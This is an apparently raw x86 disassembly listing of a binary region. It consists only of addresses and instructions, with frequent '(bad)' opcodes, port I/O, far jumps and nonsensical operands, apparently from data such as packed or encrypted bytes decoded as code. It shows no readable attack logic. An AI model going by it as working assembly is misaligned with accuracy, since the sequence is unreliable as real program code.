  405ace:	sbb    DWORD PTR [ebx+0x57],0xf91132fe
  405ad5:	out    0x4d,eax
  405ad7:	mov    edi,0xa9ef891f
  405adc:	shl    ebx,0xf8
  405adf:	ss inc esi
  405ae1:	or     BYTE PTR [edi+0x77e22887],ah
  405ae7:	dec    eax
  405ae8:	inc    ebx
  405ae9:	xchg   ebp,eax
  405aea:	push   ss
  405aeb:	sbb    BYTE PTR [ebx+ebp*4-0x3c71acae],bl
  405af2:	xor    cl,BYTE PTR [eax-0x96d6835]
  405af8:	cli    
  405af9:	push   ss
  405afa:	jb     0x405b2a
  405afc:	mov    gs,esp
  405afe:	mov    ds:0x813cca43,al
  405b03:	add    al,BYTE PTR [ecx-0x656ba391]
  405b09:	mov    ebp,DWORD PTR [ebp-0x1885dc4e]
  405b0f:	jecxz  0x405b3c
  405b11:	inc    ecx
  405b12:	fneni(8087 only) 
  405b14:	(bad)  
  405b17:	pop    DWORD PTR [eax]
  405b19:	mov    edi,0x38bcc158
  405b1e:	out    dx,al
  405b1f:	add    DWORD PTR [esi-0x512439c6],ecx
  405b25:	mul    DWORD PTR [eax+0x5aaf2d8]
  405b2b:	mov    dl,0x8e
  405b2d:	inc    eax
  405b2e:	dec    dx
  405b30:	fchs   
  405b32:	xchg   BYTE PTR [esi+edi*8+0x482230d9],dh
  405b39:	sub    DWORD PTR [eax+0x2b290682],ecx
  405b3f:	and    ebp,edi
  405b41:	inc    esp
  405b42:	mov    ah,0xb4
  405b44:	mov    ch,BYTE PTR [esi+0x2db23d90]
  405b4a:	popa   
  405b4b:	ss in  al,0xc8
  405b4e:	mov    esi,0xff57dc39
  405b53:	fdivr  QWORD PTR [edx]
  405b55:	clc    
  405b56:	addr16 push esp
  405b58:	aas    
  405b59:	xchg   DWORD PTR [eax],edx
  405b5b:	aaa    
  405b5c:	jo     0x405b03
  405b5e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405b5f:	lds    ebp,FWORD PTR [esi]
  405b61:	lods   al,BYTE PTR ds:[esi]
  405b62:	bound  eax,QWORD PTR [eax-0x2d5fcc7a]
  405b68:	loopne 0x405af1
  405b6a:	fisttp WORD PTR [eax+eax*2-0x66b563b1]
  405b71:	iret   
  405b72:	in     eax,0x52
  405b74:	sahf   
  405b75:	mov    esp,0x468328cd
  405b7a:	aaa    
  405b7b:	addr16 push esp
  405b7d:	shr    BYTE PTR [ecx],1
  405b7f:	sub    eax,0x7b38df62
  405b84:	(bad)  
  405b85:	jmp    0xb473551e
  405b8a:	adc    esi,esp
  405b8c:	loopne 0x405b23
  405b8e:	cdq    
  405b8f:	imul   esp,edi,0xc1fa6349
  405b95:	retf   0x7d67
  405b98:	xlat   BYTE PTR ds:[ebx]
  405b99:	fsubr  DWORD PTR [ebp-0x21b6a0f5]
  405b9f:	scas   al,BYTE PTR es:[edi]
  405ba0:	(bad)  
  405ba1:	pop    edx
  405ba2:	loopne 0x405b8e
  405ba4:	inc    ebx
  405ba5:	sub    al,bh
  405ba7:	int3   
  405ba8:	nop
  405ba9:	fild   DWORD PTR [ebx+0x47]
  405bac:	dec    edi
  405bad:	pop    edx
  405bae:	pop    ss
  405baf:	sbb    edi,edx
  405bb1:	mov    eax,ds:0x4e9c858
  405bb6:	sub    eax,DWORD PTR [ebx]
  405bb8:	test   esp,0xbda0c9cb
  405bbe:	out    0xa3,eax
  405bc0:	xor    BYTE PTR [ecx+0x27],cl
  405bc3:	mov    sp,0x6803
  405bc7:	scas   eax,DWORD PTR es:[edi]
  405bc8:	imul   DWORD PTR [ecx]
  405bca:	mov    eax,0xe9887144
  405bcf:	in     eax,dx
  405bd0:	in     al,0xfd
  405bd2:	inc    ebp
  405bd3:	inc    ebp
  405bd4:	inc    ebp
  405bd5:	inc    esi
  405bd6:	and    bh,BYTE PTR [esp+eax*2-0x788504cc]
  405bdd:	add    ch,BYTE PTR [esi+edx*8]
  405be0:	mov    ebx,0x7829c488
  405be5:	into   
  405be6:	int    0x18
  405be8:	call   0x39a67d66
  405bed:	aas    
  405bee:	push   ds
  405bef:	jb     0xd258e15c
  405bf5:	mov    dh,0xa6
  405bf7:	div    DWORD PTR [ebp-0x14]
  405bfa:	mov    bl,BYTE PTR [edi-0x6e]
  405bfd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405bfe:	pop    esp
  405bff:	dec    esp
  405c00:	fwait
  405c01:	popf   
  405c02:	ror    DWORD PTR [ebp+0x46e6fc9],cl
  405c08:	jne    0x405bb9
  405c0a:	jo     0x405c6c
  405c0c:	addr16 xor eax,0x5ecfc1b
  405c12:	xor    DWORD PTR [eax+0x32],edi
  405c15:	loop   0x405bb4
  405c17:	in     al,dx
  405c18:	and    al,0xff
  405c1a:	ss inc ecx
  405c1c:	in     eax,0xcc
  405c1e:	and    al,0xf7
  405c20:	cld    
  405c21:	in     al,dx
  405c22:	add    ebp,DWORD PTR [eax-0x14]
  405c25:	std    
  405c26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405c27:	pop    edi
  405c28:	add    al,0xe2
  405c2a:	push   esp
  405c2b:	cmp    ch,cl
  405c2d:	ror    BYTE PTR [esi],0xc1
  405c30:	repz mov dh,0x50
  405c33:	mov    cl,0x81
  405c35:	bound  ebp,QWORD PTR [edi+0x54d0da6e]
  405c3b:	push   esp
  405c3c:	or     DWORD PTR [edx-0x7762b9f6],eax
  405c42:	js     0x405c2a
  405c44:	xor    bh,dh
  405c46:	imul   edi,ebx,0xd8e4b864
  405c4c:	aad    0x6
  405c4e:	loop   0x405bd8
  405c50:	rcl    DWORD PTR [edi],cl
  405c52:	mov    ecx,0x199b42e8
  405c57:	ror    BYTE PTR [edi],1
  405c59:	sbb    BYTE PTR [edx+eax*4-0x24],al
  405c5d:	mov    dh,0x3c
  405c5f:	test   BYTE PTR [ecx],dh
  405c61:	xchg   esi,eax
  405c62:	push   ebp
  405c63:	data16 xor al,0x6d
  405c66:	aad    0x83
  405c68:	(bad)  
  405c69:	int3   
  405c6a:	fnsave [ebp-0x5ffbc9bd]
  405c70:	mov    ah,0xe4
  405c72:	test   al,0x4e
  405c74:	scas   al,BYTE PTR es:[edi]
  405c75:	mov    ecx,0x23c9014f
  405c7a:	mov    al,0x24
  405c7c:	jl     0x405c63
  405c7e:	or     al,BYTE PTR [ebx]
  405c80:	push   esp
  405c81:	gs pop esi
  405c83:	icebp  
  405c84:	xchg   edi,eax
  405c85:	pushf  
  405c86:	inc    ebp
  405c87:	cdq    
  405c88:	pop    eax
  405c89:	mov    al,0x58
  405c8b:	arpl   WORD PTR ds:0x14e90ef1,sp
  405c91:	mov    edx,0x8a97b345
  405c96:	jp     0x405c7a
  405c98:	jb     0x405c78
  405c9a:	neg    bh
  405c9c:	dec    esi
  405c9d:	test   DWORD PTR [edx-0xba82f1b],ecx
  405ca3:	clc    
  405ca4:	leave  
  405ca5:	das    
  405ca6:	dec    ebx
  405ca7:	jmp    0x29d6efc0
  405cac:	arpl   bp,di
  405cae:	dec    ebp
  405caf:	adc    ch,ch
  405cb1:	jp     0x405c50
  405cb3:	ins    BYTE PTR es:[edi],dx
  405cb4:	ins    BYTE PTR es:[edi],dx
  405cb5:	mov    al,BYTE PTR [esi]
  405cb7:	iret   
  405cb8:	(bad)
  405cbc:	imul   edx,DWORD PTR [ebp-0x53],0x38
  405cc0:	push   ss
  405cc1:	cs jmp 0x4f95:0xd26f245a
  405cc9:	cmp    BYTE PTR ds:0x719d7581,0x92
  405cd0:	pop    esi
  405cd1:	cdq    
  405cd2:	(bad)  
  405cd3:	adc    ecx,DWORD PTR [edx+0xab5714e]
  405cd9:	les    ecx,FWORD PTR [ebx+0x54]
  405cdc:	stos   BYTE PTR es:[edi],al
  405cdd:	xchg   ecx,eax
  405cde:	mov    ah,0xb
  405ce0:	pusha  
  405ce1:	mov    eax,ds:0x1ec7b337
  405ce6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405ce7:	je     0x405cc8
  405ce9:	fldz   
  405ceb:	jno    0x405cec
  405ced:	frstor [esi]
  405cef:	imul   esi,DWORD PTR [ebp+0x3bd13a1f],0xc74990d1
  405cf9:	cmc    
  405cfa:	ins    BYTE PTR es:[edi],dx
  405cfb:	push   ebx
  405cfc:	out    dx,al
  405cfd:	and    eax,0x1adc07b6
  405d02:	lea    esp,[eax+0x4783de1a]
  405d08:	jmp    0x405d4e
  405d0a:	fadd   DWORD PTR [edi]
  405d0c:	adc    esi,DWORD PTR [eax-0x4a]
  405d0f:	push   ecx
  405d10:	xchg   esp,eax
  405d11:	cld    
  405d12:	jg     0x405d34
  405d14:	xor    dl,BYTE PTR [ecx+0x4456686a]
  405d1a:	outs   dx,BYTE PTR ds:[esi]
  405d1b:	pop    eax
  405d1c:	fsubr  DWORD PTR [edx]
  405d1e:	sub    DWORD PTR [ebp-0x26],0xd90ee4d9
  405d25:	add    bh,BYTE PTR [ebx]
  405d27:	inc    edi
  405d28:	dec    esi
  405d29:	dec    esp
  405d2a:	pop    edi
  405d2b:	lods   al,BYTE PTR ds:[esi]
  405d2c:	push   edx
  405d2d:	xor    eax,0x6eb4320c
  405d32:	xor    esi,eax
  405d34:	inc    eax
  405d35:	lods   eax,DWORD PTR ds:[esi]
  405d36:	mov    al,0xa6
  405d38:	(bad)  
  405d3a:	pop    ebp
  405d3b:	xor    bh,BYTE PTR [esi-0x1e5c9e69]
  405d41:	daa    
  405d42:	stos   DWORD PTR es:[edi],eax
  405d43:	in     al,0xac
  405d45:	stos   BYTE PTR es:[edi],al
  405d46:	add    dl,BYTE PTR [edi+0x1f]
  405d49:	jl     0x405d44
  405d4b:	and    DWORD PTR ds:0x31cc02e8,ecx
  405d51:	jp     0x405d18
  405d53:	and    BYTE PTR [esi+0x19],dh
  405d56:	ins    BYTE PTR es:[edi],dx
  405d57:	mov    ?,WORD PTR ds:0xdc5a1dca
  405d5d:	cmp    esi,esi
  405d5f:	neg    BYTE PTR cs:[edx-0xa5f7484]
  405d66:	in     al,dx
  405d67:	sub    BYTE PTR [edx-0x47d0c274],0x91
  405d6e:	retf   0x6e74
  405d71:	jmp    0x34b3:0xd3741a8a
  405d78:	clc    
  405d79:	sub    al,BYTE PTR [edx+eiz*4-0x67]
  405d7d:	call   0x7f980e07
  405d82:	push   esi
  405d83:	xor    edx,DWORD PTR [eax+eiz*4+0x18]
  405d87:	lods   eax,DWORD PTR ds:[esi]
  405d88:	push   0xffffffe2
  405d8a:	adc    ah,dl
  405d8c:	push   ebp
  405d8d:	jl     0x405ddf
  405d8f:	leave  
  405d90:	lds    edi,FWORD PTR es:[edi+0x5bfe1070]
  405d97:	test   al,0xaf
  405d99:	mov    fs,WORD PTR fs:[edx]
  405d9c:	cmp    DWORD PTR [ecx],esi
  405d9e:	push   0x1da34f07
  405da3:	cmp    edi,DWORD PTR [ecx+0x2f6e366b]
  405da9:	out    0xa2,eax
  405dab:	mov    ah,0xd4
  405dad:	pop    eax
  405dae:	xor    BYTE PTR [edx+edx*4+0x59c9eac3],0xc0
  405db6:	call   0xb5f0d494
  405dbb:	shl    BYTE PTR [ebx+0x41],cl
  405dbe:	xchg   edi,eax
  405dbf:	cli    
  405dc0:	mov    ebx,0x4a368896
  405dc6:	pushf  
  405dc7:	pop    esi
  405dc8:	mov    ecx,DWORD PTR [esi-0x67294052]
  405dce:	popa   
  405dcf:	xchg   esi,eax
  405dd0:	xor    ch,BYTE PTR [ebx]
  405dd2:	ja     0x405e28
  405dd4:	adc    eax,0x6329f5d5
  405dd9:	shl    DWORD PTR [bx],cl
  405ddc:	sub    BYTE PTR ds:0xc3caae0f,0xc
  405de3:	mul    DWORD PTR [ecx-0x6e5fc313]
  405de9:	sub    ecx,DWORD PTR [edx]
  405deb:	stc    
  405dec:	sbb    al,0x8b
  405dee:	xchg   esi,eax
  405def:	mov    ah,0xd
  405df1:	xor    DWORD PTR ds:0x468a9ee,ebx
  405df7:	or     al,0x79
  405df9:	xor    eax,0x413a869a
  405dfe:	mov    ah,0xb5
  405e00:	fwait
  405e01:	outs   dx,BYTE PTR ds:[esi]
  405e02:	mov    edi,0x5422e971
  405e07:	push   edi
  405e08:	cmp    eax,0x4e7b8921
  405e0d:	jl     0x405e04
  405e0f:	mov    ds:0x76164a69,al
  405e14:	es sub esi,esp
  405e17:	loopne 0x405e1f
  405e19:	inc    ebp
  405e1a:	in     eax,0xa
  405e1c:	repz cli 
  405e1e:	idiv   BYTE PTR [eax+0x2943202d]
  405e24:	cs mov eax,fs:0x35adeb0e
  405e2b:	das    
  405e2c:	xchg   esi,eax
  405e2d:	aam    0x93
  405e2f:	fcomp  DWORD PTR [ecx-0x69]
  405e32:	pop    ebp
  405e33:	ins    BYTE PTR es:[edi],dx
  405e34:	in     eax,dx
  405e35:	pop    edi
  405e36:	in     al,0x4d
  405e38:	cld    
  405e39:	xor    dh,dl
  405e3b:	es cmc 
  405e3d:	(bad)  
  405e3e:	popf   
  405e3f:	and    ecx,ebp
  405e41:	sbb    ch,ch
  405e43:	or     BYTE PTR [esp+edx*2-0x102f92],dh
  405e4a:	pusha  
  405e4b:	js     0x405e59
  405e4d:	pop    ebp
  405e4e:	inc    edi
  405e4f:	fdiv   QWORD PTR [edi-0x46]
  405e52:	pop    ecx
  405e53:	dec    ebp
  405e54:	pushf  
  405e55:	xsaves [edi+0x52891ee5]
  405e5c:	shr    DWORD PTR [esi+0x7b],0x7a
  405e60:	dec    ecx
  405e61:	adc    ecx,edi
  405e63:	icebp  
  405e64:	mov    al,ds:0xe5eb6c
  405e69:	mov    ecx,0xddbf829d
  405e6e:	pop    ss
  405e6f:	push   esp
  405e70:	or     BYTE PTR [eax],al
  405e72:	or     al,bh
  405e74:	fs dec ebx
  405e76:	stos   BYTE PTR es:[edi],al
  405e77:	sbb    edi,DWORD PTR [ebx-0x4290bdd0]
  405e7d:	pop    ss
  405e7e:	xor    eax,0x172f0888
  405e83:	out    0x56,al
  405e85:	ret    0xbd79
  405e88:	test   edi,ecx
  405e8a:	cmc    
  405e8b:	push   0x40
  405e8d:	jmp    0xe596:0xd434e4e
  405e94:	jp     0x405e16
  405e96:	dec    eax
  405e97:	pop    esp
  405e98:	rol    ecx,cl
  405e9a:	or     BYTE PTR ds:0xa0a8615e,ch
  405ea0:	sar    BYTE PTR ds:0x3ae6b492,1
  405ea6:	outs   dx,DWORD PTR ds:[esi]
  405ea7:	push   ss
  405ea8:	sub    cl,bh
  405eaa:	pop    ss
  405eab:	mov    ah,0xe
  405ead:	sti    
  405eae:	retf   
  405eaf:	shr    BYTE PTR [edx+0x29ca30e5],1
  405eb5:	add    cl,dh
  405eb7:	(bad)
  405ebb:	mov    al,ds:0x1c9244e6
  405ec0:	add    al,0xe6
  405ec2:	lea    esi,[edi]
  405ec4:	loopne 0x405e65
  405ec6:	leave  
  405ec7:	loop   0x405f34
  405ec9:	(bad)  [ecx]
  405ecb:	mul    cl
  405ecd:	rol    bl,cl
  405ecf:	push   ds
  405ed0:	or     esi,DWORD PTR [ecx+0x44a061]
  405ed6:	xor    edi,ebx
  405ed8:	out    dx,al
  405ed9:	xchg   esp,eax
  405eda:	push   ds
  405edb:	addr16 push es
  405edd:	adc    cl,BYTE PTR ds:[esi-0x71529c4c]
  405ee4:	jecxz  0x405eea
  405ee6:	jae    0x405f51
  405ee8:	aad    0x8d
  405eea:	das    
  405eeb:	out    dx,eax
  405eec:	push   ds
  405eed:	and    dl,al
  405eef:	cmp    BYTE PTR [ebx+0x19],bl
  405ef2:	sti    
  405ef3:	outs   dx,BYTE PTR ds:[esi]
  405ef4:	cli    
  405ef5:	mov    dl,0xfe
  405ef7:	bound  edx,QWORD PTR [ebx+0x491fb94d]
  405efd:	inc    ecx
  405efe:	loopne 0x405f19
  405f00:	add    esp,DWORD PTR ds:0x2b1ea140
  405f06:	mov    ch,0x54
  405f08:	mov    dh,0x6a
  405f0a:	cdq    
  405f0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405f0c:	or     DWORD PTR [edi-0x1a],ebx
  405f0f:	int    0x73
  405f11:	adc    bh,BYTE PTR [esi+0x35]
  405f14:	scas   al,BYTE PTR es:[edi]
  405f15:	xor    eax,0xbf1cec9a
  405f1a:	fidivr DWORD PTR [ebp+esi*2-0x17e5292b]
  405f21:	xchg   ecx,eax
  405f22:	ins    BYTE PTR es:[edi],dx
  405f23:	jg     0x405f2f
  405f25:	es mov ecx,gs
  405f28:	inc    ebx
  405f29:	fist   WORD PTR [edx+ebx*4]
  405f2c:	jg     0x405f09
  405f2e:	fdivr  st,st(6)
  405f30:	into   
  405f31:	popa   
  405f32:	mov    al,0xdf
  405f34:	in     al,0x2c
  405f36:	mov    edi,0xb01559b1
  405f3b:	jns    0x405eeb
  405f3d:	aas    
  405f3e:	xchg   esp,eax
  405f3f:	xchg   ebx,eax
  405f40:	add    BYTE PTR [ebx+0x3b8c2a65],bl
  405f46:	fistp  DWORD PTR [esi-0x37]
  405f49:	out    dx,al
  405f4a:	mov    cl,al
  405f4c:	xor    esi,DWORD PTR [edi+0x67]
  405f4f:	cld    
  405f50:	loop   0x405f3f
  405f52:	push   eax
  405f53:	jne    0x405f18
  405f55:	popa   
  405f56:	add    eax,0x2c18c714
  405f5b:	lds    eax,FWORD PTR [edi-0x4e]
  405f5e:	inc    edx
  405f5f:	sub    ecx,DWORD PTR [edi+0x7c993c5b]
  405f65:	(bad)  
  405f67:	jmp    0x405ef7
  405f69:	pop    ecx
  405f6a:	adc    eax,DWORD PTR [eax+0x1e7afd06]
  405f70:	popf   
  405f71:	call   0x83c5254
  405f76:	int    0x39
  405f78:	add    DWORD PTR [esp+ebp*4+0x76],ebp
  405f7c:	mov    ebp,0x37dd454a
  405f81:	mov    bh,0x2b
  405f83:	popf   
  405f84:	push   edi
  405f85:	mov    esp,0xb9e4698b
  405f8a:	jb     0x405f12
  405f8c:	xchg   esp,eax
  405f8d:	je     0x405fd5
  405f8f:	adc    al,0x9e
  405f91:	(bad)  
  405f92:	into   
  405f93:	lahf   
  405f94:	int    0xf6
  405f96:	hlt    
  405f97:	pop    edx
  405f98:	add    edx,edx
  405f9a:	test   edi,ecx
  405f9c:	enter  0xef56,0xce
  405fa0:	(bad)
  405fa4:	icebp  
  405fa5:	adc    dl,BYTE PTR [edx]
  405fa7:	and    eax,0xf175a255
  405fac:	cdq    
  405fad:	data16 (bad) [edx+0x21633ad4]
  405fb4:	jge    0x405f91
  405fb6:	fdivr  DWORD PTR ds:0xca2ba7ce
  405fbc:	mov    ebp,0x2e16f55d
  405fc1:	cldemote BYTE PTR [ebp-0x3c6ec34b]
  405fc8:	cmp    eax,0x5e3910f4
  405fcd:	shl    BYTE PTR [ecx-0x3f],cl
  405fd0:	cmp    ecx,DWORD PTR [edi]
  405fd2:	or     dh,BYTE PTR [ecx+0x310548ab]
  405fd8:	into   
  405fd9:	or     BYTE PTR [edi+0x5f],ah
  405fdc:	pop    ss
  405fdd:	popa   
  405fde:	cmp    cl,al
  405fe0:	adc    al,0x8
  405fe2:	pushf  
  405fe3:	cld    
  405fe4:	div    DWORD PTR [edi+0x6d111b7a]
  405fea:	mov    dh,0xf1
  405fec:	mov    bl,0xc6
  405fee:	adc    dl,cl
  405ff0:	mov    ebp,0x16c8c98e
  405ff5:	loope  0x406053
  405ff7:	jmp    0x7fa4:0xb5cc3487
  405ffe:	dec    ebx
  405fff:	int3   
  406000:	cmp    esi,DWORD PTR [ebp-0x1f3d7a2d]
  406006:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406007:	ja     0x40602f
  406009:	cld    
  40600a:	jns    0x40606f
  40600c:	and    DWORD PTR [ecx+0x6b],0x2d
  406010:	add    dh,BYTE PTR [esi]
  406012:	repz adc edx,DWORD PTR [ebp-0x7d]
  406016:	mov    BYTE PTR ss:[ebx+0x6a],bl
  40601a:	loopne 0x405fbb
  40601c:	fist   DWORD PTR [edi-0x42]
  40601f:	fcomp  st(0)
  406021:	mov    bl,0xf9
  406023:	cmp    dl,bh
  406025:	fwait
  406026:	adc    ah,dh
  406028:	ja     0x406052
  40602a:	data16 jns 0x405fbb
  40602d:	pop    eax
  40602e:	mov    ebx,0x589c19bd
  406033:	jne    0x405fde
  406035:	sbb    bh,bl
  406037:	ret    
  406038:	sbb    eax,0x2c015f0d
  40603d:	adc    bl,0x1
  406040:	fdivr  DWORD PTR [esi+eiz*2+0x157abe9b]
  406047:	sbb    al,0xeb
  406049:	or     edx,DWORD PTR [edi+eiz*8-0x583c5c15]
  406050:	aaa    
  406051:	inc    ecx
  406052:	jmp    0xb429:0xbea17d3c
  406059:	mov    ds:0x5cd25a6c,eax
  40605e:	dec    ecx
  40605f:	jnp    0x406035
  406061:	outs   dx,BYTE PTR ds:[esi]
  406062:	add    al,BYTE PTR [ebp+0x5]
  406065:	call   FWORD PTR [ecx-0x1]
  406068:	fcmovbe st,st(1)
  40606a:	enter  0x7790,0xe5
  40606e:	out    dx,al
  40606f:	jle    0x4060f0
  406071:	lahf   
  406072:	sbb    eax,0xec39e982
  406077:	stos   BYTE PTR es:[edi],al
  406078:	js     0x4060a0
  40607a:	mov    ecx,DWORD PTR [ecx-0x2b]
  40607d:	pop    ss
  40607e:	pop    ebp
  40607f:	cmp    esp,DWORD PTR [esi+eiz*1-0x173c0eb9]
  406086:	pop    ecx
  406087:	pusha  
  406088:	mov    bh,0xfe
  40608a:	jno    0x406010
  40608c:	aaa    
  40608d:	mov    ebx,0x6129efc4
  406092:	mov    al,ds:0xb96c8228
  406097:	(bad)  
  406098:	fistp  WORD PTR [eax-0x19]
  40609b:	outs   dx,BYTE PTR ds:[esi]
  40609c:	cmp    BYTE PTR [edi-0x16e6ff0],dh
  4060a2:	aad    0xab
  4060a4:	jb     0x406109
  4060a6:	sub    ah,BYTE PTR [esi+0x548f780d]
  4060ac:	ret    
  4060ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4060ae:	rcl    ebx,1
  4060b0:	rol    BYTE PTR [ebx+0x44],cl
  4060b3:	(bad)  
  4060b4:	cmp    eax,0xd2796c77
  4060b9:	adc    bh,BYTE PTR [ebx]
  4060bb:	lea    esp,[edi+0x769da475]
  4060c1:	(bad)  [eax+0x57]
  4060c4:	xchg   BYTE PTR [eax-0x1a288f9b],cl
  4060ca:	fistp  WORD PTR [ecx+eax*2+0xd]
  4060ce:	daa    
  4060cf:	jae    0x40613b
  4060d1:	fisttp WORD PTR [ebx+0x4f]
  4060d4:	jecxz  0x4060ba
  4060d6:	add    DWORD PTR [edx-0x5e],esi
  4060d9:	sbb    al,0xfe
  4060db:	(bad)  
  4060de:	std    
  4060df:	aad    0x34
  4060e1:	cmp    al,BYTE PTR [edx+0x22c7e066]
  4060e7:	sub    bh,dl
  4060e9:	jae    0x4060ad
  4060eb:	jmp    0x55a1039d
  4060f0:	xchg   ecx,eax
  4060f1:	or     ch,BYTE PTR [esp+ebx*4]
  4060f4:	out    0xb9,al
  4060f6:	shr    BYTE PTR [esi-0x59328053],1
  4060fc:	mov    ds:0xec66e9f1,eax
  406101:	fmulp  st(3),st
  406103:	gs pop esi
  406105:	(bad)  [ebp+0x535bec09]
  40610b:	adc    eax,0x61f7720
  406110:	ss adc al,bl
  406113:	enter  0x5ea8,0x6a
  406117:	ja     0x406179
  406119:	mov    edi,0x42322717
  40611e:	xor    al,0x5b
  406120:	mov    ss,ebx
  406122:	test   DWORD PTR [eax],edx
  406124:	lea    ecx,ds:0xfe2a9ac8
  40612a:	sti    
  40612b:	out    0xf,eax
  40612d:	mov    dl,BYTE PTR ds:[ebp+0x9]
  406131:	outs   dx,DWORD PTR ds:[esi]
  406132:	ret    0xfdda
  406135:	into   
  406136:	hlt    
  406137:	add    eax,0xc5a29d60
  40613c:	fistp  QWORD PTR [esi]
  40613e:	cld    
  40613f:	(bad)  
  406140:	jmp    0x475a8efc
  406145:	jns    0x40612d
  406147:	(bad)  
  406149:	sub    al,0xd2
  40614b:	mov    al,ds:0xbc11056f
  406150:	mov    ch,0xab
  406152:	xchg   ebp,eax
  406153:	popa   
  406154:	sti    
  406155:	add    edx,ebp
  406157:	cmc    
  406158:	daa    
  406159:	into   
  40615a:	sub    esi,edi
  40615c:	test   eax,0x62da586
  406161:	cmp    ecx,eax
  406163:	cs add ah,dh
  406166:	jbe    0x406195
  406168:	jl     0x4061b7
  40616a:	sub    esp,ebp
  40616c:	sbb    ebp,ebp
  40616e:	push   ebx
  40616f:	mov    cl,0x97
  406171:	out    dx,al
  406172:	push   ds
  406173:	adc    ebp,DWORD PTR [eax]
  406175:	mov    dl,0x43
  406177:	xchg   BYTE PTR [esi],ch
  406179:	lds    edi,FWORD PTR [ebx-0x44]
  40617c:	xchg   edx,eax
  40617d:	sahf   
  40617e:	pop    edi
  40617f:	in     al,dx
  406180:	in     al,dx
  406181:	scas   al,BYTE PTR es:[edi]
  406182:	ds into 
  406184:	loop   0x40614c
  406186:	daa    
  406187:	lods   eax,DWORD PTR ds:[esi]
  406188:	fwait
  406189:	je     0x406159
  40618b:	jg     0x406160
  40618d:	xor    eax,0xf40f43e6
  406192:	sti    
  406193:	fsubrp st(5),st
  406195:	push   edx
  406196:	(bad)  
  406197:	cmc    
  406198:	aaa    
  406199:	mov    WORD PTR [ebx],?
  40619b:	mov    ds:0xc74d250a,eax
  4061a0:	xlat   BYTE PTR ds:[ebx]
  4061a1:	inc    ebx
  4061a2:	arpl   WORD PTR [ebp+edx*2-0x7c73eea4],bx
  4061a9:	jge    0x4061ea
  4061ab:	sbb    BYTE PTR [esi],dh
  4061ad:	pop    ebp
  4061ae:	popf   
  4061af:	shl    DWORD PTR [esi+0x115a914c],0x95
  4061b6:	shl    DWORD PTR [ebp+0x24],0x6c
  4061ba:	mov    ebp,0xe6c2119f
  4061bf:	out    dx,al
  4061c0:	std    
  4061c1:	xor    ebx,DWORD PTR [eax]
  4061c3:	cmp    al,0x3a
  4061c5:	add    DWORD PTR [ebp+esi*4-0x41],0x42b527c6
  4061cd:	jmp    0x88bdc3a2
  4061d2:	sub    eax,0x2ed19614
  4061d7:	mov    bh,0x44
  4061d9:	nop
  4061da:	ja     0x4061f3
  4061dc:	mov    ebp,0x40bb7ab0
  4061e1:	and    dl,BYTE PTR [eax-0x7e3e9fed]
  4061e7:	test   al,0xf6
  4061e9:	adc    ebx,DWORD PTR ds:0x7d12e6a8
  4061ef:	pop    edx
  4061f0:	sbb    al,BYTE PTR [ebx-0x7f]
  4061f3:	and    al,0x4a
  4061f5:	popa   
  4061f6:	inc    edx
  4061f7:	adc    BYTE PTR [esi+0x5d],cl
  4061fa:	(bad)  
  4061fb:	push   ebp
  4061fc:	test   eax,0xb365fc51
  406201:	cdq    
  406202:	push   ebp
  406203:	loop   0x406206
  406205:	aad    0x6b
  406207:	xchg   ebp,eax
  406208:	inc    esi
  406209:	fisttp QWORD PTR [eax+0x2b]
  40620c:	jge    0x406218
  40620e:	sbb    ecx,DWORD PTR [edi]
  406210:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406211:	iret   
  406212:	jl     0x4061a6
  406214:	add    eax,0x5b2edeb6
  406219:	or     bl,dl
  40621b:	aam    0xfb
  40621d:	xor    DWORD PTR [ecx],ebx
  40621f:	dec    ebx
  406220:	scas   eax,DWORD PTR es:[edi]
  406221:	xor    dl,dl
  406223:	sbb    DWORD PTR [ebx-0x1c],edx
  406226:	(bad)  
  406227:	pop    ecx
  406228:	mov    BYTE PTR [ebp+edx*4-0x55],dl
  40622c:	inc    esp
  40622d:	push   eax
  40622e:	xor    DWORD PTR [edi+0x4113e6a7],edx
  406234:	sbb    eax,0xebdd6af7
  406239:	adc    DWORD PTR [edi-0x31],ebp
  40623c:	cmp    eax,edx
  40623e:	(bad)  
  40623f:	cmp    DWORD PTR [ebx+0x6b],esi
  406242:	out    dx,al
  406243:	mov    cl,BYTE PTR [esp+esi*1]
  406246:	mov    ecx,0xe94af563
  40624b:	dec    ebp
  40624c:	(bad)  
  40624d:	adc    al,0xc6
  40624f:	mov    ecx,0xf169cc54
  406254:	popf   
  406255:	cmp    cl,BYTE PTR [edi+0x6c732169]
  40625b:	adc    esi,edi
  40625d:	int3   
  40625e:	or     ecx,DWORD PTR [ebp+0x3cfda867]
  406264:	cmp    eax,DWORD PTR [edi]
  406266:	ins    BYTE PTR es:[edi],dx
  406267:	xchg   BYTE PTR [ebx+0x4061ed7f],dl
  40626d:	jecxz  0x406275
  40626f:	pop    ds
  406270:	add    eax,0xb565a687
  406275:	fs pop edx
  406277:	xchg   esi,eax
  406278:	arpl   WORD PTR [edx-0x6e],bx
  40627b:	ins    DWORD PTR es:[edi],dx
  40627c:	xchg   ebx,eax
  40627d:	js     0x4062c1
  40627f:	xor    edx,DWORD PTR [esi]
  406281:	pop    edx
  406282:	jnp    0x406267
  406284:	add    DWORD PTR [ecx+0x9],ecx
  406287:	pop    esi
  406288:	daa    
  406289:	sbb    eax,0x743081f6
  40628f:	fild   DWORD PTR [ebx-0x4b]
  406292:	out    dx,eax
  406293:	dec    ebx
  406294:	add    eax,0x74d244c2
  406299:	ss xor ebx,esi
  40629c:	or     ah,BYTE PTR [ebp+0x3f]
  40629f:	inc    edi
  4062a0:	mov    bh,0x54
  4062a2:	push   0x42
  4062a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4062a5:	xchg   ebp,eax
  4062a6:	scas   eax,DWORD PTR es:[edi]
  4062a7:	inc    edi
  4062a8:	hlt    
  4062a9:	mov    ebp,0xebdcbc0c
  4062ae:	add    ah,bh
  4062b0:	mov    dl,0x57
  4062b2:	pop    ecx
  4062b3:	ret    
  4062b4:	push   es
  4062b5:	jno    0x406256
  4062b7:	fisub  WORD PTR [ebx]
